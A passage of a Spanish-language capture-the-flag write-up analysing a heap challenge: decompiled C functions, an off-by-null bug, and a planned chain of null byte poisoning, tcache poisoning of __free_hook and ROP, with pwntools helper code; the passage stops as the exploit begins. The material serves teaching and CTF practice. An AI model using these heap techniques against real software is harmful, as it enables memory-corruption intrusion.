<span class="mtk1">        </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">size);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">0x</span><span class="mtk6">1f0</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> size) </span><span class="mtk5">||</span><span class="mtk1"> ((size </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">110</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (</span><span class="mtk5">0x</span><span class="mtk6">f8</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> size)))) {</span>
<span class="mtk1">          </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"According to research, such a dream length is imp</span><span class="mtk4">ossible :(</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">, stderr);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">          </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) size;</span>
<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"data: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">6</span><span class="mtk1">, stderr);</span>
<span class="mtk1">        p_dream </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(size);</span>
<span class="mtk1">        dreams[(ulong)index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> p_dream;</span>
<span class="mtk1">        </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">], size);</span>
<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"done</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">, stderr);</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index_copy </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (dreams[(ulong) index_copy </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
<span class="mtk1">      index </span><span class="mtk5">=</span><span class="mtk1"> index_copy;</span>
<span class="mtk1">      </span><span class="mtk5">goto</span><span class="mtk1"> LAB_001014a3;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    index_copy</span><span class="mtk5">++</span><span class="mtk1">;</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1">( </span><span class="mtk6">true</span><span class="mtk1"> );</span>
<span class="mtk1">}</span>
</code></pre></div><p>Como se puede ver, podemos usar <em>chunks</em> de tamaño máximo <code>0x1f0</code> y los tamaños entre <code>0xf0</code> y <code>0x108</code> no están permitidos.</p><p>Hay una variable global llamada <code>dreams</code> que almacena el tamaño ingresado por el usuario y la dirección del <em>chunk</em> asignado.</p><h3 id="función-de-edición">Función de edición</h3><p>Esta es <code>edit_dream</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">edit_dream</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> ret;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> c;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> i;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret_copy;</span>

<span class="mtk1">  </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"index: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, stderr);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">19</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"uafs are for noobs</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">13</span><span class="mtk1">, stderr);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Input data: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">, stderr);</span>

<span class="mtk1">      </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong)index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">); i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">c, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        ret_copy </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) ret;</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (ret_copy </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">          </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Error with writing to diary!"</span><span class="mtk1">,</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">1c</span><span class="mtk1">, stderr);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">          </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">        dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">][i] </span><span class="mtk5">=</span><span class="mtk1"> c;</span>
<span class="mtk1">      }</span>

<span class="mtk1">      dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">][i] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid index</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, stderr);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Esta función verifica si el <em>chunk</em> existe o no, por lo que no hay una vulnerabilidad de <em>Use After Free</em> evidente. La modificación de los datos del <em>chunk</em> es casi correcta, hay un error aquí:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">      dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">][i] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>  
</code></pre></div><p>Si elegimos el tamaño máximo de información para el <em>chunk</em> y usamos la función de edición, después del bucle <code>for</code>, el contador <code>i</code> estará fuera de los límites por un byte. Por lo tanto, la instrucción anterior pone un byte nulo fuera de los límites (también conocido como <em>off-by-null</em>).</p><p>Obsérvese también que no podemos poner bytes nulos o saltos de línea aquí:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">break</span><span class="mtk1">;</span>  
</code></pre></div><h3 id="función-de-liberación">Función de liberación</h3><p>Esta es <code>delete_dream</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">delete_dream</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">do_delete</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>

<span class="mtk1">  </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"index: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, stderr);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">19</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (do_delete </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"double frees are not cool</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">1a</span><span class="mtk1">, stderr);</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">free</span><span class="mtk1">(dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">]);</span>
<span class="mtk1">        dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"diary page deleted</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">13</span><span class="mtk1">, stderr);</span>
<span class="mtk1">      }</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"diary doesn</span><span class="mtk6">\'</span><span class="mtk4">t exist here</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">19</span><span class="mtk1">, stderr);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">data: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">]);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid index</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, stderr);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Una vez más, esta función parece segura porque verifica si el <em>chunk</em> todavía existe en la lista global <code>dreams</code>. Además, una vez que se libera un <em>chunk</em>, tanto su tamaño como su dirección se eliminan de la lista.</p><h3 id="función-de-información">Función de información</h3><p>Esta función se combina con <code>delete_dreams</code>. La parte relevante está aquí:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  <span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"diary doesn</span><span class="mtk6">\'</span><span class="mtk4">t exist here</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">19</span><span class="mtk1">, stderr);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">data: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">]);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid index</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, stderr);</span>
<span class="mtk1">  }</span>
</code></pre></div><p>Simplemente muestra el contenido de un <em>chunk</em> dado como una cadena (por lo tanto, se detendrá en un byte nulo).</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>El único error que tenemos es el <em>off-by-null</em>. Este error se puede aprovechar para realizar una técnica conocida como <em>null byte poisoning</em>. La idea de esta técnica es abusar del hecho de que los <em>chunks</em> del <em>heap</em> están adyacentes para modificar las <em>flags</em> del siguiente <em>chunk</em>. Entonces, las <em>flags</em> <code>AMP</code> se establecerán en <code>000</code> en binario, lo que indica que el fragmento anterior no está en uso.</p><p>Entonces, podemos encadenar esta modificación de las <em>flags</em> con un <em>chunk</em> falso con punteros <code>fd</code> y <code>bk</code> maliciosos, liberar el <em>chunk</em> modificado y el desencadenar <code>malloc_consolidate</code>. Como resultado, realizaremos una especie de <em>exploit</em> de <em>Unsafe Unlink</em>, que proporcionará <em>chunks</em> solapados (<em>overlapping chunks</em>) y, por lo tanto, podremos realizar un ataque de Tcache <em>poisoning</em> para apuntar a <code>__free_hook</code>. Creo que este ataque se conoce como House of Einherjar, pero no estoy muy seguro.</p><p>Recordemos que Glibc está parcheado y hay reglas <code>seccomp</code>, por lo que tendremos que usar ROP. Encontré dos formas de ejecutar una cadena ROP en este entorno de <em>heap</em>. Una es apuntar a ciertos <em>gadgets</em> mágicos existentes en Glibc para controlar muchos registros y cambiar el puntero de la pila (<code>$rsp</code>) al <em>heap</em>. La otra manera es encontrar una fuga de una dirección de pila utilizando <code>environ</code> de Glibc e ingresar la cadena ROP en la pila, modificando la dirección de retorno guardada como de costumbre.</p><p>Hay algunos giros más al final de la explotación, se verán en la siguiente sección.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Usaremos estas funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">size</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'size: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'data: '</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Input data: '</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">recount</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvuntil(</span><span class="mtk7 mtki">b</span><span class="mtk4">'data: '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvuntil(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">1. write about dream'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>  
</code></pre></div><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>En primer lugar, debemos obtener algunas fugas de memoria para realizar las técnicas antes mencionadas. En los retos de explotación del <em>heap</em> que involucran Tcache es bastante común llenar la lista libre del Tcache de un tamaño mayor que <code>0x80</code> (para evitar <em>chunks</em> de categoría <em>Fast Bin</em>), de modo que cuando se libera otro <em>chunk</em>, se guarda en la lista de <em>Unsorted Bin</em>. Como resultado, el <em>chunk</em> tendrá punteros a <code>main_arena</code> tanto en <code>fd</code> como en <code>bk</code>.</p><p>Aunque no podemos mostrar el contenido directamente porque no hay <em>Use After Free</em>, aún podemos asignar un nuevo <em>chunk</em> allí y modificar solo el último byte, dejando el resto de la dirección intacta y disponible para mostrarse.</p><p>Además, podemos aplicar el mismo truco para filtrar una dirección del <em>heap</em> modificando un <em>chunk</em> del Tcache.</p><p>Con el siguiente código, tendremos la dirección base de Glibc y del <em>heap</em> (es necesario usar GDB para encontrar los <em>offsets</em> correctos):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
